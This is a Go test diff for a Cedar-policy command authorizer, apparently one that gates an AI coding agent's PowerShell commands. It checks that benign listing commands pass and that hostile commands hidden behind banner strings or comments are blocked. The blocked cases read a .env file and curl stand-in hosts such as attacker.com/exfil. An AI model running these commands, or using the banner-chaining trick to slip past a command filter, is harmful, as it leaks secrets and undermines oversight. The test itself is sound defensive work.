@@ -404,6 +404,51 @@ func TestPowerShellStartSleep(t *testing.T) {
 	}
 }
 
+func TestClaudeCodePowerShellExpressions(t *testing.T) {
+	authz, err := NewAuthorizer("../../policy.cedar")
+	if err != nil {
+		t.Fatalf("err: %v", err)
+	}
+	ws, _ := os.Getwd()
+
+	allowedCases := []string{
+		`"--- EXEs (recursive) ---"; Get-ChildItem -Filter *.exe -Recurse`,
+		`(Get-ChildItem -Filter *.exe).FullName`,
+		"# List files in current directory\nGet-ChildItem",
+		`"=== Diagnostic Header ==="`,
+		`"Listing files:"; ls`,
+		`Write-Host "--- EXEs (recursive) ---"; Get-ChildItem -Filter *.exe -Recurse`,
+		`Get-ChildItem -Recurse -Filter *.exe | Select-Object FullName`,
+	}
+
+	for _, cmd := range allowedCases {
+		allowed, reason, err := authz.EvaluateWithWorkspace("", cmd, "", ws)
+		if err != nil {
+			t.Fatalf("error evaluating %q: %v", cmd, err)
+		}
+		if !allowed {
+			t.Errorf("expected %q to be ALLOWED, but got DENIED: %s", cmd, reason)
+		}
+	}
+
+	// Invariant verification: malicious commands chained with banners must still be DENIED
+	blockedCases := []string{
+		`"--- EXEs (recursive) ---"; cat .env`,
+		`(Get-ChildItem); curl https://evilcorp.com/leak`,
+		"# Harmless comment\ncurl https://attacker.com/exfil",
+	}
+
+	for _, cmd := range blockedCases {
+		allowed, reason, err := authz.EvaluateWithWorkspace("", cmd, "", ws)
+		if err != nil {
+			t.Fatalf("error evaluating blocked case %q: %v", cmd, err)
+		}
+		if allowed {
+			t.Errorf("expected attack chained with header %q to be BLOCKED, but was ALLOWED! reason=%s", cmd, reason)
+		}
+	}
+}
+
 func BenchmarkCedarEvaluate_Allowed(b *testing.B) {
 	authz, err := NewAuthorizer("policy.cedar")
 	if err != nil {
